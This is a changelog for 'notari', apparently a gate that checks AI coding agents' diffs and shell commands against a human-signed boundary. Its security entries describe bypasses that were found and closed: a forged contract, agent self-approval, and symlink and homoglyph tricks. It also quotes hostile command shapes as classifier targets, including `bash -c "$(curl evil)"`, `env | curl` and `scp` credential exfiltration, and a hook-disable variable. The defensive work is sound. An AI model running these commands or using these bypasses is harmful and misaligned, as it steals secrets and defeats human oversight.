# Changelog

All notable changes to `notari` are documented here. The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.4.0] - a link is a path too

The local gate gets a Touch ID path that actually presents on a normal
`uv`/`pip` install, the approval flow gets an explicit auth ladder, and a
pre-launch security probe closed the one boundary crossing that was still
merging on a green check.

### Fixed (security)

- **A symlink whose resolved target lands on a forbidden or gate-tamper surface
  now BLOCKs.** Previously such a link was reported accurately but graded
  NEEDS_REVIEW, which exits 0 and merges by default, so `src/anything ->
  ../../migrations` produced a green check even in strict mode while renaming a
  file into that same directory blocked. A link into a protected path is the same
  boundary crossing as a rename into it and is now treated as one. Links that
  stay inside the boundary, point outside the repository, or aim at a path the
  perimeter does not protect keep the review treatment, so the change does not
  over-fire. Found by an adversarial probe run against a signed perimeter,
  2026-07-22.
- **The Touch ID helper is installed 0o700, not 0o755.** Nothing about the
  approval helper needs to be group- or world-executable.
- **Dependency lock refreshed** to clear two advisories carried by the pinned
  development environment (`cryptography` GHSA-537c-gmf6-5ccf, `msgpack`
  GHSA-6v7p-g79w-8964). Released packages already resolved above both floors;
  this brings the committed lockfile in line.

### Added

- **Touch ID that presents under uv/pip installs.** A vendored Objective-C helper
  (source-hash pinned, compiled on first use) owns the LocalAuthentication sheet,
  because the python-build-standalone interpreter uv installs carries no team
  identifier and could never draw the dialog itself.
- **An explicit approval auth ladder**: real biometric first, a typed-phrase TTY
  challenge when the sensor cannot present, and a refusal when there is no
  controlling terminal at all unless `--no-biometric` is passed and logged.
- **Sensitive-directory writes ask even in bypass mode**, so the one-off escape
  hatch does not silently cover the paths that matter most.

## [0.3.4] - the first run actually blocks something

An external tri-lens review (code, product, market) found that the default
first-run gate blocked almost nothing: `init` then `begin` with no scope left
an empty allow-list that passes any non-forbidden path, so a skeptic could init,
throw a backdoor at it, and get PASS. Fixed, plus the signing commands are now
discoverable and two homoglyph / replay gaps are closed.

### Changed

- **`notari init` seeds real forbidden paths.** It scans the repo (bounded depth,
  skipping vendored/build dirs) and forbids the sensitive directories actually
  present (auth, migrations, infra, terraform, deploy, secrets, payments,
  billing, Dockerfiles, `*.tf`, `.env` files), so the very first verify BLOCKs an
  obviously-dangerous edit. It only auto-seeds when you did not pass `--forbid`;
  explicit intent always wins, and it tells you exactly what it picked.
- **`notari begin` warns on an empty scope**, because a contract with no `--scope`
  passes most diffs (only the perimeter's forbidden list bites). The warning
  names the fix.
- **The boundary-setup commands are visible again.** `keygen`, `guard`, and
  `verify-passport` moved from hidden into a "Boundary setup" help panel; the
  users configuring strict mode need to find the commands that make it real.

### Fixed (security)

- **Homoglyph / mixed-script paths now BLOCK.** A changed path that mixes scripts
  (a Cyrillic, Greek, Armenian, Cherokee, or other non-Latin letter spliced into
  a Latin segment) or is a wholly-non-Latin word that reads as an ASCII word now
  fails the build. The deny-side confusable table is finite, so a broad
  allow-scope could otherwise admit an out-of-table lookalike; this catches the
  whole class by cross-script detection rather than a lookup, and it BLOCKs (not
  a soft review that merges by default) because no benign code path mixes scripts.
  Legitimate single-script non-Latin filenames are unaffected.
- **Strict-mode replay branches are now tested end to end.** A validly-signed
  contract bound to the wrong repository, and one whose base commit is a real but
  non-ancestor commit, each have a regression test proving they BLOCK (these
  branches previously had no negative coverage).

## [0.3.3] - a CLI for people who don't read terminals

### Changed

- **The help surface is now three panels instead of a 25-command wall**: Core
  (`init`, `begin`, `verify`, `explain`, `status`), Safety (`off`, `on`,
  `approve`), and Health & evidence (`doctor`, `version`, `audit`). Every other
  command still works by name (`notari <command> --help` included); it just is
  not shouted at newcomers.
- **`notari verify` hands off to the browser on failure**: it writes the
  self-contained fix-it page and opens it, on failure only, only in an
  interactive terminal, never in CI. `--open`/`--no-open` win;
  `NOTARI_OPEN=always|never|on-failure` overrides the default. A browser
  failure can never change the verdict or the exit code.

Verified against a real production-shaped repo (Next.js app with migrations):
keys auto-gitignored alongside an existing .gitignore, PASS on an in-scope
component change, BLOCK with correctly attributed secret / forbidden-path /
out-of-scope findings, honest posture readout.

## [0.3.2] - the first-run actually PASSes

A cold-user test of the documented quickstart never produced a green PASS:
`begin` freezes its base before the boundary commit lands, so the perimeter's
own files rode inside base..head and tripped gate-tamper (plus the perimeter's
baked-in forbidden globs), turning a fully in-scope first change into a BLOCK.

### Fixed

- **Cooperative-mode verify no longer flags the signed boundary as tamper.**
  When the perimeter's signature verifies against the pinned approver keys,
  `.notari/perimeter.json`/`.sig` inside the diff are the authorization
  arriving, not an attack (the agent cannot forge that signature). Strict CI
  semantics are unchanged: a PR that (re)introduces even a validly-signed
  perimeter still BLOCKs there, so a replayed old perimeter can never widen
  scope at the merge boundary. Regression-tested both ways.
- **`notari keygen --out` inside a git repo now gitignores both key files**
  (idempotent), so a naive `git add -A` cannot commit the private key and trip
  the secret scanner on the first verify. `notari init` already did this for
  its keys dir; the manual path now has the same protection.
- **`notari begin` warns when setup files are uncommitted** (perimeter,
  `.gitignore`), with the exact commands to land them first, because anything
  uncommitted at `begin` time rides inside the task's diff.
- QUICKSTART reordered to match reality (setup commit, then `begin`, then the
  contract commit) and now includes a see-it-PASS step before the see-it-BLOCK
  step, so the happy path is the first verdict a new user meets.
- Typographic pass across all docs, CLI strings, and comments (house style:
  no em dashes). No behavioral changes beyond the items above.

## [0.3.1] - docs and launch-surface fixes

No code changes to the gate itself. This release exists mainly so the PyPI
page carries the corrected README (the 0.3.0 PyPI description froze pre-fix
copy, including a placeholder Action pin in the CI example).

### Fixed

- README install section no longer carries a stale rename note that contradicted
  the published dist; the CI workflow example ships the real release-action pin
  instead of a `RELEASE_SHA` placeholder; hero images use absolute URLs so they
  render on PyPI; a terminal demo recording of the full verify → explain →
  lessons loop is embedded.
- SECURITY.md rewritten against the current product (CI change-control gate +
  local tool-dispatch gate); the previous version still described the removed
  MCP-proxy architecture. Claims tightened to what the code does: gate
  signatures are configuration-dependent and labeled unsigned otherwise, any
  in-scope symlink/submodule pointer change surfaces as NEEDS_REVIEW, and the
  file-permission claim now matches `notari doctor`'s warn-only behavior.
  Supported-versions table now says 0.3.x.
- docs/SECURITY-MODEL.md deployment checklist now shows the SHA-pinned Action
  form (`notari status` rejects mutable-tag pins) instead of a `@v0` example
  the tool itself would reject.
- CONTRIBUTING.md updated from proxy-era wording; CODE_OF_CONDUCT.md
  (Contributor Covenant 2.1) added.
- release.yml publish step no longer `continue-on-error` (Trusted Publishing is
  registered; a publish failure should fail the release), and stale pre-rename
  comments were removed. `pyproject.toml` keywords no longer lead with the
  removed MCP-proxy surface.

## [0.3.0] - public alpha

Notari Change Control: a CI/CD pull-request gate that verifies an AI-written diff
against a human-signed task boundary and issues a tamper-evident Change Passport.
This is the first public-alpha release.

### Renamed, Quill → Notari

The project was renamed from Quill (dist `quillx`, briefly Nota during the
transition) to Notari before this release: CLI `quill` → `notari`, PyPI dist
`quillx` → `notari`, import path `quill` → `notari`, state dir `~/.quill/` →
`~/.notari/`, env vars `QUILL_*` → `NOTARI_*`, schema strings `quill.*` →
`notari.*`. There is no automatic migration from pre-rename dogfood installs
(the 0.2.x alphas had no meaningful adoption): reinstall hooks with
`notari integrate` / `notari init` since previously installed hooks reference
the old binary name, re-run `notari onboard`, and move `~/.quill/` state
manually if you want to keep it. 0.3.0 is the first release under the
`notari` name.

### The action loop (verify → explain → fix-prompt → lessons → teach)

- **`notari explain`** turns a passport into plain-English remediation: per finding,
  what's wrong, a safe `git checkout -- <path>` self-fix, and a paste-ready coding-agent
  prompt, plus "what Notari does not prove." Formats: `text`, `json`, `html` (a
  self-contained fix-it page with copy buttons), and `github` (CI annotations on the
  exact PR diff line). `--fix-prompt` / `--agent-brief` emit the compact agent surfaces.
- **`notari lessons` / `lessons promote` / `teach` / `agent-brief`**: repeated local
  mistakes (recorded to `.notari/mistakes.jsonl`, never code/diffs/prompts/secret values)
  aggregate into deterministic suggested lessons a human promotes into `CLAUDE.md`,
  `AGENTS.md`, or Cursor rules via an idempotent managed block. Local by default, no
  telemetry. See `docs/LEARNING-LOOP.md`.
- **`passport.md`** now leads with an action block (verdict → what to do next → agent
  fix prompt → "what Notari does not prove") and collapses the raw evidence; it is written
  to the CI step summary, and findings post as inline PR annotations.

### Correctness / hardening

- Change Passport schema `v1.1`: additive top-level `remediation` array (v1 readers
  unaffected).
- Symlink opacity: an in-scope symlink redirecting at a forbidden path surfaces as
  NEEDS_REVIEW with the target recorded.
- Approval tokens can no longer begin with `-` (CLI-unpassable).
- Mistake recording is fingerprint-deduplicated (re-verifying a commit doesn't inflate
  counts) and swarm-safe (atomic append under concurrent agents).
- Docs, version, and Action pin coherent at 0.3.0; secure-workflow template and
  README pin the release commit SHA (not a mutable tag). Release dry-run captured in
  `docs/LAUNCH-DRY-RUN-0.3.0.md`.

### Honesty

- Positioned as an honest alpha: a deterministic structural-authorization gate, **not**
  a code reviewer, correctness prover, or compliance product. `docs/SECURITY-MODEL.md`
  states the local-gate limits, the CI-boundary requirements, the spoofable-status and
  unlocked-dependency residuals, and the no-external-audit status; the MCP proxy is
  documented as removed in the Change Control pivot.

## [Unreleased]

### Wave 13, security-review response: close the contract bypass, stop overclaiming

An independent skeptical review found a complete bypass of the central claim, and it was right. Fixing the root and downgrading every claim the code could not back.

**P0-1: the per-PR contract was forgeable (complete bypass).** The contract supplies the base commit and allowed scope, but it was unsigned and branch-authored. An agent could commit malicious code in M, then a second commit that rewrites `.notari/contract.json` to set `base_commit: M` and a wildcard scope; `git diff M..C` then showed only the contract file, which `evaluate_diff` strips, so the malicious commit vanished from the verification interval and the verdict was PASS even under strict perimeter provenance. **Fix:** `notari verify --strict` now requires the contract itself to be signed by a trusted approver (`notari begin --key`), so a rewritten or forged contract fails its signature and BLOCKs. Reproduced and pinned by `test_p0_1_contract_rebase_after_malicious_commit_blocks`.

**P0-2: unsigned exceptions could waive whole finding classes.** An unsigned `.notari/exceptions.json` with an empty path matched every finding of a type. **Fix:** strict mode no longer honors branch-authored exceptions at all (signed one-use waivers are a follow-up). Pinned by `test_p0_2_unsigned_exceptions_do_not_waive_in_strict`.

**Honesty pass (the review's other half).** Downgraded the README hero from "proves an AI agent's change did only what a human approved" / "the verdict is signed so it can't be faked" / "an adversarial agent cannot fool the gate" to the honest scope: a merge-boundary gate that enforces *structural* authorization (paths, forbidden surfaces, secrets), not semantic correctness, with the deployment requirements and the no-external-audit status stated up front. Fixed `controls.toml`: removed the ISO 42001 "essentially the reference implementation" overclaim and the stale event names (`notify.dispatched`, `tool.pin_refused`) the pivot left behind; the event-pin test now enforces that every control maps to a real registered event, with no allow-list.

**Documented the remaining open items honestly** in `docs/SECURITY-MODEL.md`: the Action-wrapper fail-closed behavior, binary/rename diff coverage, and off-box evidence anchoring are still open, so the CI gate is alpha and not yet audited. 1087 tests pass.


### Wave 12, the trust spine: sign the boundary once, the agent can't forge it

Answers the two questions that decide whether Change Control is a real control or theater: *can the agent fake its own approval?* and *can a human trust the verdict without watching every change?* Both are now "no", built on Ed25519 (verification uses a public key, forging needs the private key, the asymmetry the symmetric HMAC chain could never provide).

**Sign-once standing perimeter (`notari guard`).** A human signs the boundary one time, what agents may touch, what they may never touch, secrets always blocked, into `.notari/perimeter.json` + `.notari/perimeter.sig`. From then on every PR from every agent is checked against that signed boundary automatically (`notari verify` enforces it), and a human is paged only when a change crosses the line, never on routine in-bounds work. This is the answer to "I'm not going to sit and approve a hundred agents." `src/notari/perimeter.py`, `provenance.py`.

**The agent cannot authorize itself.** Editing the gate's own trust surfaces, the perimeter, the approver keys (`.notari/approvers/**`), or the workflow that runs the check, is always a BLOCK (`gate_tamper`, scanned on the raw diff so a `.notari/` edit can't hide). So an agent can't widen its own boundary or commit its own signing key to bootstrap trust. Tampering with a signed perimeter invalidates the signature; in `--strict` mode an unsigned / tampered / absent perimeter BLOCKs rather than silently passing. Trust-spine tests prove each property, including the bootstrap-trust attack.

**The verdict cannot be forged.** With a gate key (`notari verify --strict --sign-key`, or `NOTARI_GATE_KEY` in CI) the Change Passport is signed by the gate identity; anyone re-verifies it with `notari verify-passport` against the gate public key. A flipped verdict or an untrusted signer fails. `src/notari/attest.py`, `passport.py`.

**A second root of trust: GitHub PR approval.** `notari check-approval` requires a human who is *not* the PR author to have approved the *current head commit*, an agent can't approve its own PR, and the approval is dismissed when new code is pushed, so it can't be replayed against unseen code. Pure decision logic, network-isolated from the deterministic `verify` path. `src/notari/github_review.py`.

**New surface.** CLI: `notari keygen` (Ed25519 approver/gate keypair), `notari guard` (sign the perimeter), `notari verify --strict --sign-key`, `notari verify-passport`, `notari check-approval`. The GitHub Action gains `strict`, `gate-key`, and `approver-pubkeys` inputs (pass from secrets). Smoke-tested end to end through the real CLI: keygen → guard → in-bounds PASS with a gate-signed passport → independent verify-passport → forbidden change BLOCKs → flipped-verdict passport REJECTED. New base dependency: `cryptography`.

**Honest about deployment.** This is a real boundary against an adversarial agent only when the trust root is off the PR's reach: private keys in repo/org secrets (not committed), the Action pinned to a published tag (not the PR's own checkout), and the Status Check required in branch protection. `docs/SECURITY-MODEL.md` carries the exact checklist and upgrades the "CI gate runs outside the agent" claim to Supported-deployment-gated; the README leads with the trust spine and states the requirement plainly.

### Wave 11, Change Control pivot + launch-readiness finish

**The product pivoted to Change Control, and this wave makes the repo honestly match it.** Notari's headline is now a CI/CD pull-request gate: `notari begin` captures the human-approved task and scope into `.notari/contract.json`, `notari verify` diffs `base..HEAD` against that contract (scope match, per-added-line secret scan, sensitive-surface classification, logged exceptions), composes a `PASS` / `NEEDS_REVIEW` / `BLOCK` verdict, and writes a tamper-evident **Change Passport** (`passport.json` + PR-ready `passport.md`) that cites the `verification.run` audit MAC. A composite GitHub Action (`action.yml`) runs it on every PR and publishes a commit Status Check. The pivot (98bf17b) removed the MCP proxy, the macOS Seatbelt/ESF sandbox, the desktop dashboard, and the out-of-band notification channels; the local PreToolUse gate, Touch ID approvals, and the HMAC audit chain remain as a clearly-scoped defense-in-depth surface. Verified end-to-end this wave: in-scope diff → PASS, out-of-scope diff → BLOCK with the path named, passport citing the chain.

**Why Change Control is the headline (and the local gate is not):** the CI gate runs in a process the agent cannot reach, so it is an *enforced* boundary that produces *provable* evidence; the local app-layer gate is real defense-in-depth but is bypassable by a determined adversary (write-then-run, flag reorder, inherited-env, ungated egress, `docs/SECURITY-MODEL.md` limits 1-4). The README, SECURITY.md, and SECURITY-MODEL.md now lead with the claim the code can back and scope the rest honestly; the claims-calibration table in SECURITY-MODEL.md is the launch gate for all copy.

**Fixed a broken `HEAD`.** The committed Claude Code adapter imported `notari.code_scan` and called `learning.record_decision_learning`, but both lived only in the uncommitted working tree, so a fresh checkout would `ImportError`/`AttributeError` on the write and hot paths. Landed both: `code_scan.py` is a deterministic AST scan of about-to-be-written Python for destructive shapes (`shutil.rmtree`, `os.system`, `exec(b64decode(...))`), a partial close of the write-then-run loophole (limit 3) at write time; `record_decision_learning` de-duplicates the three inlined learning folds on the hot paths (audit #46). Tests in `tests/test_code_scan.py`.

**`mypy --strict` is green and enforced.** Cleared the residual type errors (stale Touch ID import ignores routed through a mypy override, an `Any` return cast in the bash-allowlist cache, and a dead orphan-reap block left over from the daemon removal) and dropped the `|| true` on the CI mypy step, so the `typed-strict` badge, the `py.typed` marker, and the `Typing :: Typed` classifier are now claims the build actually enforces. `ruff` and `ruff format` were already clean and hard-gated.

**Numbers reconciled to ground truth + pinned.** Replaced the stale, self-contradictory headline counts (the README said 24,478 audit entries and "18 vs 26" secret patterns; LAUNCH said 11k entries / 598 tests) with durable phrasing tied to reality, 32k+ entries over ~45 days, 26 vendor secret patterns, 1030+ tests. `tests/test_doc_counts.py` pins the secret-pattern count as single-source-of-truth and fails if the README and `secrets._PATTERNS` ever disagree again (audit #5/#31/#44).

**Doc hygiene.** Removed `docs/HOOK-VS-PROXY.md` (it documented the deleted proxy). Untracked `docs/marketing/*` (kept on disk, gitignored): pre-pivot positioning and 12-standard compliance claims that overclaim for an alpha and describe removed surfaces. SECURITY.md now states supply-chain controls honestly (pip-audit blocking is real and enforced; Trusted Publishing / Scorecard / SBOM are marked planned, not present) and supported versions moved 0.1.x → 0.2.x. `FINISH-STATUS.md` records the full 58-finding triage and the identity decision with its rationale.

### Wave 10, approval-flow hardening + self-approval fix

**SECURITY, `notari approve` no longer lets an agent approve its own blocked call.** Dogfooding a real blocked force-push exposed a hole: when Touch ID is unavailable, `notari approve` used to fall through to a typed-token-only approval. But the agent's own process has no GUI/Secure-Enclave session, so `touchid.is_available()` is always False there - and the agent can read the raw token from `notari approvals list` - which meant an agent could read its own token and self-approve its own CRITICAL block with zero human involvement, defeating the entire "even you cannot walk past it until I approve" model. Fixed: an unavailable sensor now **refuses** approval by default (emitting `approve.biometric.deny`), so approval can only happen from a session where Touch ID actually fires (the operator's GUI Terminal). `--no-biometric` remains an explicit, logged opt-in for genuine headless use; `--require-biometric` overrides it (paranoid mode). Regression tests in `tests/test_approvals.py` verify the refusal and the opt-in.

**`notari approve --latest` (smoother human-in-the-loop).** The same dogfooding showed the token UX was fiddly: the operator had to copy an exact token string, and the audit log shows a *hashed* token id (the Tier-0 privacy fix) that resembles the token but isn't. `notari approve --latest` (and a bare `notari approve`) now resolves to the most recently issued pending block, so the operator just confirms "yes, the thing I was asked about" with Touch ID - no copying. Backed by `ApprovalStore.latest_pending()`, which skips already-approved and expired tokens even when newer.

### Wave 9, classifier false-positive sweep

The inverse of the Wave 8 bypass audit: where that closed false *negatives* (dangerous commands slipping through), this closes false *positives* (safe commands wrongly escalated to HIGH/CRITICAL). Over-blocking is itself a security failure - a gate that pauses on `git rm --cached` and `pip install` trains the operator to yes-spam, which is the exact failure mode the gate exists to prevent. A 30-agent sweep battery-tested 6,354 realistic safe commands across 30 domains (git, docker, kubectl, npm, pip/uv, cargo, go, the cloud CLIs, filesystem, text processing, db clients, and more) through the real classifier and surfaced 43 false positives across 9 over-firing patterns. Six were unambiguous classifier bugs and are fixed; each fix is paired with a regression test asserting the genuinely-dangerous twin still fires, so a narrowing never silently re-opens a bypass (`tests/test_false_positives_2026_06.py`).

**Fixed classifier bugs:** (a) `git rm --cached` / `git rm` read as a destructive shell `rm`, git rm is repo-scoped and recoverable, now excluded via a `(?<!git )` guard, and `git rm --cached` is explicitly LOW; (b) `npm publish --dry-run` (which uploads nothing, and is the policy's own recommended pre-flight) no longer matches the `npm publish` CRITICAL; (c) `.env.example` / `.env.sample` templates and docs whose name merely contains `.env` (`deploy.env.md`) no longer match the credential-read patterns, while real `.env` / `.env.local` still do; (d) `scp -i ~/.ssh/key file host:` no longer false-fires, the credential must be the source arg before the remote target, not an `-i`/`-F` auth-flag value (real `scp ~/.aws/credentials host:` exfil, including with an `-i` flag present, still CRITICAL); (e) `eval "$(direnv hook bash)"` / `eval $(ssh-agent -s)` shell-init idioms are no longer CRITICAL, `eval` of a command substitution is CRITICAL only when it fetches/decodes remote content (`eval "$(curl ...)"`).

**Posture decisions (operator-confirmed):** package installs (`pip`/`npm`/`brew install`) downgraded from HIGH to MEDIUM, the dominant noise source (27 of 43), and supply-chain risk from a malicious package is not something a command-name regex adjudicates well; `open <url>` downgraded HIGH→MEDIUM; `env` / `printenv` kept HIGH deliberately, because that classification marks the session's lethal-trifecta taint state and downgrading it would weaken a real exfil defense, not just remove a prompt.

### Wave 8, classifier bypass audit (Tier-0/1/2)

Three rounds of empirical red-teaming against `classify_command`, each running a battery of evasions through the real classifier and closing only the slips it confirmed, with the genuinely-unbounded shapes kept on the record as xfail residual tests rather than chased with fragile regex. Tests: 874 → 970. The threat model (`docs/SECURITY-MODEL.md`) is updated so limits 1 and 4 reflect what is now caught versus what remains residual.

**Tier-0 (2026-06-11 audit)** closed the literal-form bypasses: `cat '.env'` / `cat "$HOME/.aws/credentials"` reading LOW because quote-masking erased the credential path, `rm --recursive --force` (long flags) reading as a single-file rm, `env | curl` exfil being auto-allowable, approve-tokens being readable+replayable from the audit log (now only a sha256 prefix is logged), malformed-input fail-open (now fail-closed), and the live `NOTARI_SKIP_DISABLE_AUTH` bypass var (removed). 12 tests in `tests/test_audit_fixes_tier0.py`.

**Tier-1 (2026-06-12)** closed the cheap, well-known obfuscations a wider probe still found slipping as MEDIUM: `${IFS}`/`$IFS` whitespace games (now normalised to a space before classification), single-variable reconstruction (`x=rm; $x -rf`, caught via a backreference tying a destructive-verb assignment to its later dereference), `printf`/`echo` payloads piped to an interpreter, and `wget --post-file` credential exfil. 23 tests + 2 xfail residual (glob-expanded binary paths) in `tests/test_audit_fixes_tier1.py`.

**Tier-2 (2026-06-12)** closed a further 19 slips from a 35-shape probe: ANSI-C `$'\x72\x6d'` escape reconstruction (decoded before matching, the same principled approach as `${IFS}`), command-substitution binary resolution (`$(echo rm) -rf`), `eval` of a destructive literal, `shred`, and a real silent-allow bug where `git branch -D` matched the LOW `git branch` list pattern and was auto-allowed (plus `git reflog expire` / `git filter-branch`). Also a family of non-pipe credential-egress channels the `read | curl` pattern missed, `scp`/`curl -F @cred`/`curl --data-binary @cred`/`nc < cred`/`openssl < cred`, `find -name id_rsa`, interpreter one-liners that read a file/env and POST it, and env-var gate-disable (`export CLAUDE_HOOKS_DISABLED=1`). This is a partial mitigation for limit 4, not egress gating. 21 tests + 2 xfail residual (importance-unknown truncation, write-then-run loophole) in `tests/test_audit_fixes_tier2.py`. Verified zero new false-positives against a benign battery.

### Wave 7, one-command off switch + kill-test hardening

Shipped the operator-requested easy on/off switch and closed four real gate bypasses found while building the adversarial test suite. Tests: 840 → 874.

**`notari off` / `notari on`, a true, bounded, audited off switch** (`src/notari/pause.py`, aliases `notari pause` / `notari resume`). One command turns the gate fully off when it's in the way, instead of the trail-destroying escape hatches (hand-editing settings.json, or `--dangerously-skip-permissions`) that the kill-test doc warns push operators away from the gate entirely. The honesty contract that keeps it safe: (1) BOUNDED, every pause auto-expires (default 1h, hard max 24h), so a forgotten pause self-heals; (2) LOGGED, `gate.paused` / `gate.resumed` are their own audit events carrying reason + duration, and the resume bracket is closed even on auto-expiry; (3) MARKED, every tool call allowed while paused is written to the audit log with `gate_paused: true`, so the window's contents are reconstructable call-by-call. Unlike `notari night` (auto-approves HIGH, still gates CRITICAL), pause turns the gate fully off including CRITICAL, a half-off switch is exactly what drives the bad bypasses. The pause check runs in the `claude-hook` entry point BEFORE the classifier self-test, so it doubles as the recovery hatch when the classifier itself is broken. 13 tests in `tests/test_pause.py`.

**SECURITY, denied calls no longer auto-approve their own retry.** The approval store treated issuance as approval: the gate auto-issues a one-shot token on every block (so the notification can offer `notari approve <token>`), and `consume()` matched any *issued* token, so a denied command sailed through on its immediate identical retry with no operator action, meaning the gate only ever blocked the FIRST attempt of anything. Fixed by separating issuance from approval: a token is only consumable after `approve()` sets `approved_at` (which `notari approve`, Touch-ID-gated where available, now does). `consume()` gates on the new `is_consumable` rather than `is_active`. Regression test plus updated lifecycle tests in `tests/test_approvals.py`.

**SECURITY, shell-bypass classifier gaps closed** (`src/notari/policy.py`). The quote-masker (which blanks quoted strings so `TRUNCATE` in a commit message doesn't false-fire) was over-masking security-relevant content, letting four documented kill-test payloads through as MEDIUM/LOW: (a) `bash -c "$(curl evil)"`, command substitution is shell-executed even inside double quotes, so the masker now preserves `$(…)` and backtick spans; (b) `python - <<'PY' … rmtree … PY` heredocs, (c) `find "$HOME" -name "*.env"` credential globs, and (d) `python -c "…rmtree…"` / `node -e "…rmSync…"` interpreter one-liners, all carry their payload inside quotes, now caught by a raw-command scan anchored to a leading interpreter/`find` verb so quoted prose still doesn't false-fire. Also fixed `cat ~/.npmrc` (credential-file read) reading as LOW. False-positive guards added alongside.

**Adversarial kill-test suite** (`tests/test_kill_test_2026_06.py`, 29 tests). Section 9 of the kill-test review encoded as executable regression tests, allowlist bypass, private env read, secret-pipe exfil, encoded/substitution shell, interpreter/heredoc delete, find-by-credential-glob, approval replay/expiry, obfuscation, gate self-tamper, the standing answer to "prove the P0 fixes actually work."

**Response to the second external review ("walls made of paper").** That critique's core point is correct and we say so plainly in a new `docs/SECURITY-MODEL.md`: an application-layer regex gate is defense-in-depth, not a hard boundary against a determined adversarial agent, and the real fixes (shell AST / intent classification, kernel-layer eBPF/Seatbelt syscall enforcement, network-egress proxy) are architectural, not pattern additions. What we *did* close, as honest defense-in-depth: (a) common shell obfuscations, `$(which rm) -rf` command-substitution-to-binary and `$a$b -rf` variable assembly now CRITICAL, with single-variable reconstruction and arbitrary grammar games documented as known limits rather than chased; (b) **gate self-tamper**: an Edit/Write/redirection targeting `~/.claude/settings.json`, `~/.cursor/hooks.json`, or `~/.notari/config.toml` is now CRITICAL (checked before any user-policy override so it can't be unlocked), covering the reviewer's "attacker rewrites settings.json to alter hook routing" within the app-layer scope. The threat-model doc also corrects two README overclaims to flag for sign-off: "the audit log your auditor will accept" → "auditor-reviewable evidence", and clarifying that "the gate cannot be jailbroken" (true, no LLM in it) is not "cannot be bypassed".

### Wave 6, anti-yes-fatigue + ISO 22324 severity colors

Four product changes shipped together so the operator who said "stop annoying me" gets less friction without softening any bright line.

**Bypass-mode awareness in `classify_event`.** When the operator is running Claude Code with `--dangerously-skip-permissions` (or has set `NOTARI_BYPASS_MODE=1` / `CLAUDE_DANGEROUSLY_SKIP_PERMISSIONS=1`), Notari silently logs default-HIGH events instead of prompting. They show up in the audit log, in `notari saves`, and in `notari watch` exactly as before, just without the y/N round-trip the operator already opted out of. Critical class never softens (rm -rf, force-push, DROP TABLE, sudo, secret-detected, trifecta-closed all still gate). Detection precedence: hook-payload field (`permission_mode` / `bypass_mode` / `dangerously_skip_permissions`, forward-compatible against Anthropic exposing it) > env var > default off. 11 tests in `tests/test_bypass_mode.py`.

**Auto-promote frequently-approved patterns in-flow.** New detector `detect_auto_promote_candidate` fires the first time a pattern crosses 5 approvals within a 7-day window with 0 denies. Surfaces as a `policy.promotion_suggested` suggestion in `~/.notari/suggestions.jsonl` and as an inline hint under the next block message for the same pattern. Critical/secret/trifecta pattern IDs are excluded as defense in depth. Operator confirms with `notari suggestions promote`; nothing auto-applies. 7 tests in `tests/test_auto_promote.py`.

**Session-scoped approval memory (`src/notari/session_approvals.py`).** Within one Claude Code session, an exact (tool_name, args-digest) pair the operator already approved via one-shot token no longer re-asks. Storage: `~/.notari/session_approvals/<session_id>.json`, atomic tmp-rename writes at 0o600, 24h hard TTL per entry. Path-traversal-resistant session ID sanitization. Critical/secret/trifecta classes never qualify. Audit log still grows fully on the bypassed prompt - this only suppresses the operator-facing y/N. 10 tests in `tests/test_session_approvals.py`.

**ISO 22324 + NIST/CIS-aligned severity colors in `notari saves` / `notari insights` / `notari watch`** (`src/notari/severity.py`). Single source of truth for the color + icon + text-label mapping across CLI and browser surfaces. Critical = red + `X` icon, high/medium = yellow + `!` / `~`, ok / trust auto-allow = green + `+`, trifecta = red + `*`, chain = magenta + `=`, secret = red + `$`, pin-refusal = red + `X`. Every paint() output keeps the icon in plain mode so NO_COLOR terminals and screen readers still convey severity; color is decoration. `notari watch` palette retuned: medium moved from blue (#6a9bf4) to amber-soft (#e6a23c) so it matches ISO 22324's warning-yellow band; every risk row in the browser TUI now leads with the same single-char icon as the CLI. 12 tests in `tests/test_severity.py`.

Validation: ISO 22324:2015 (Societal security - Emergency management - Guidelines for colour-coded alerts), NIST SP 800-61 r2 § 3.2.6, CIS Critical Security Controls v8, OWASP risk-rating taxonomy all agree on red=critical, yellow=warning, green=safe. Accessibility primary source: no-color.org convention; icon-paired-with-color is the documented WCAG 1.4.1 mitigation for color-blind users.

Tests: 812 → 852. 40 new tests across the four files above. Lint clean on touched files. Zero regressions.

### Wave 5, rigid menu commands + integrate path + cross-user learning design

Strategic shift: the open-source Notari becomes a tool with an actively-useful surface (not just a "pause button" people forget about until something breaks). Three new top-level commands plus a privacy-respecting plan for collective learning.

**`notari saves`, rigorous, audit-log-grounded value report.** Streams the audit log line-by-line (safe on hundred-MB chains), filters to a configurable window (`--today` / `--week` / `--month` / `--all` / `--since YYYY-MM-DD`), and separates **verified counts** (every event type the log emits) from **estimated time saved** (with the per-prompt assumption documented inline). Reports: trust-scope auto-allows, critical-risk blocks, secrets caught, Touch ID approvals consumed/denied, tool-description rug-pulls refused, trifecta enforcements, scope violations, chain repairs, top-N patterns blocked (canonicalized from raw reason text via 18 normalizers anchored to `policy.py`), the first critical catch in the window. Time-saved estimate uses configurable bounds (2.5s to 5s per y/N prompt). Pure aggregation, no LLM. Implemented in `src/notari/saves.py` (~310 lines) + 42 tests covering every metric path against synthetic fixtures. Verified against the live 22k-event audit log: 61 critical blocks, 15 trifecta enforcements, 32 `rm -rf` catches across the window.

**`notari insights`, per-pattern analysis + recommendations.** Goes deeper than `saves`: for each pattern, computes fire frequency, block-vs-ask ratio, most-recent fire, and a calibrated heuristic recommendation (`keep critical` / `trust-path candidate` / `watching (low signal)` / `review (mixed signal)`). Surfaces trust-path effectiveness ranked by auto-allows-per-path. Flags sessions worth reviewing (trifecta closes, chain repairs, critical blocks between 2-4am as the "probable tired-eyes catches" heuristic). Output includes explicit downgrade candidates and per-row next-step CLI suggestions. Implemented in `src/notari/insights.py` (~280 lines) + 19 tests. Verified against the live log: Bash (default) correctly flagged as trust-path candidate (78 asks, 0 blocks); 5 trifecta sessions surfaced for review.

